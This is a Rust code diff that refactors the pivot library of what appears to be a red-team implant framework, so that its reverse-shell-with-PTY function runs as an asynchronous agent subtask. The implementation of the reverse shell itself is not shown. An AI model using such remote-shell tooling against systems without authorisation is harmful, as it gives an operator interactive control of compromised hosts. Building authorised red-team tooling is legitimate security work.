@@ -22,10 +22,12 @@ use russh_sftp::client::SftpSession;
 use std::sync::Arc;
 use transport::SyncTransport;
 
+use eldritch_agent::Agent;
+
 #[derive(Default)]
 #[eldritch_library_impl(PivotLibrary)]
 pub struct StdPivotLibrary {
-    pub transport: Option<Arc<dyn SyncTransport>>,
+    pub agent: Option<Arc<dyn Agent>>,
     pub repl_handler: Option<Arc<dyn ReplHandler>>,
     pub task_id: Option<i64>,
 }
@@ -40,12 +42,12 @@ impl core::fmt::Debug for StdPivotLibrary {
 
 impl StdPivotLibrary {
     pub fn new(
-        transport: Arc<dyn SyncTransport>,
+        agent: Arc<dyn Agent>,
         repl_handler: Option<Arc<dyn ReplHandler>>,
         task_id: i64,
     ) -> Self {
         Self {
-            transport: Some(transport),
+            agent: Some(agent),
             repl_handler,
             task_id: Some(task_id),
         }
@@ -54,15 +56,37 @@ impl StdPivotLibrary {
 
 impl PivotLibrary for StdPivotLibrary {
     fn reverse_shell_pty(&self, cmd: Option<String>) -> Result<(), String> {
-        let transport = self
-            .transport
+        let agent = self
+            .agent
             .as_ref()
-            .ok_or_else(|| "No transport available".to_string())?;
+            .ok_or_else(|| "No agent available".to_string())?;
         let task_id = self
             .task_id
             .ok_or_else(|| "No task_id available".to_string())?;
-        reverse_shell_pty_impl::reverse_shell_pty(transport.clone(), task_id, cmd)
-            .map_err(|e| e.to_string())
+
+        let cmd_clone = cmd.clone();
+
+        // We clone agent because we move it into the future
+        let agent_clone = agent.clone();
+
+        let task_id_val = task_id.clone();
+        agent.spawn_subtask(
+            task_id_val,
+            "reverse_shell_pty".to_string(),
+            alloc::boxed::Box::pin(async move {
+                if let Some(transport) = agent_clone.get_sync_transport() {
+                    if let Err(e) = reverse_shell_pty_impl::reverse_shell_pty(transport, task_id_val, cmd_clone) {
+                        #[cfg(debug_assertions)]
+                        log::error!("Reverse shell error: {}", e);
+                    }
+                } else {
+                    #[cfg(debug_assertions)]
+                    log::error!("No transport available for reverse shell subtask");
+                }
+            })
+        )?;
+
+        Ok(())
     }
 
     fn reverse_shell_repl(&self) -> Result<(), String> {
